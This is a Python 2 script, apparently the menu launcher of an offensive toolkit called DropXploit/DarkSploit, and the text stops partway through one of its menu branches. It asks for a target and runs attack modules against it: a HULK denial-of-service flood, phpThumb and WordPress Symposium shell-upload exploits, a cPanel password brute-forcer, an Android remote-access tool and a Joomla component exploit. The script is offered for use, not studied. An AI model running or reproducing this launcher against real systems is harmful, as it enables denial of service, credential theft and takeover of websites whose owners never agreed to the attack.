#!/usr/bin/env python
# -*- coding: utf-8 -*-
# TOOLS  NAME :  DropXploit
# Coded by Programmer pemalas :'v
# Author : LOoLzeC
# Coded by deray
#Change Copyright can't make u real coder:)
import os
import sys
import time
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()

if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
time.sleep(1)
os.system("cd banner;python banner.py")
print ""+N+"          =[ "+O+"DarkSploit v.1 by Deray"+N+"             ]"
print "   + -- --=[ 8 Exploits - 10 Scanners            ]"
print "   + -- --=[ 5 Post - 17 Virus                   ]"
print "   + -- --=[ http://zumizec-com.waper.co/        ]"
print
dr = raw_input(""+N+"DrXp > ")
time.sleep(2)
print " => "+R+"",dr
time.sleep(3)
if dr == "use exploit/power_dos":
	print "set target"
	target = raw_input(""+N+"DrXp > use exploit("+R+"power_dos"+N+"): ")
	print "target =>"+R+"",target
	run = raw_input(""+N+"DrXp > ")
	if run == "run":
		os.system("python modules/hulk_attacks/hulk.py %s" % (target))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[*] wrong input!"
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		time.sleep(1)
		sys.exit()
elif dr == "use exploit/php_thumb_shell_upload":
	print "set target"
	list = raw_input(""+N+"DrXp > ("+R+"php_thumb_shell_upload"+N+"): ")
	time.sleep(1)
	print "target =>"+R+"",list
	go = raw_input(""+N+"DrXp > ")
	if go == "run":
	 	time.sleep(2)
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd exploit_phpthumb;perl rcexploit.pl %s" % (list))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[*] Wrong input"
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		time.sleep(1)
		sys.exit()
elif dr == "use exploit/cpanel_bruteforce":
	print "set target"
	vc = raw_input(""+N+"DrXp > ("+R+"cpanel_bruteforce"+N+"): ")
	time.sleep(1)
	print "target => "+R+"",vc
	usr = raw_input(""+N+"SET user > ")
	time.sleep(1)
	print "username = >"+R+"",usr
	port = raw_input(""+N+"SET Lport > ")
	time.sleep(1)
	print "LPORT = > "+R+"",port
	pss = raw_input(""+N+"SET list >")
	time.sleep(1)
	print "list =>"+R+"",pss
	pas = raw_input(""+N+"SET savepass > ")
	time.sleep(1)
	print "save on => "+R+"",pas
	god = raw_input(""+N+"DrXp > ")
	if god == "run":
		time.sleep(2)
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd cpanel;perl cpanel.pl %s %s %s %s %s" % (vc,usr,port,pss,pas))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use exploit/android_remote_acces":
	print ""+N+" => now u can enter 'show options'"
	os.system("cd modules;cd android;python android.py")
elif dr == "use exploit/joomla_com_hdflayer":
	print "set target"
	t = raw_input(""+N+"DrXp > ("+R+"joomla_com_hdflayer"+N+"): ")
	time.sleep(1)
	print "target => "+R+"",t
	f = raw_input(""+N+"SET shellock > ")
	time.sleep(1)
	print "target => "+R+"",f
	r = raw_input(""+N+"DrXp > ")
	time.sleep(1)
	if r == "run":
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd  modules;cd exploit_joomla;python2 exploitjoomla.py -t %s -f %s" % (t,f))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use exploit/wp_symposium_shell_upload":
	print "set target"
	vc = r
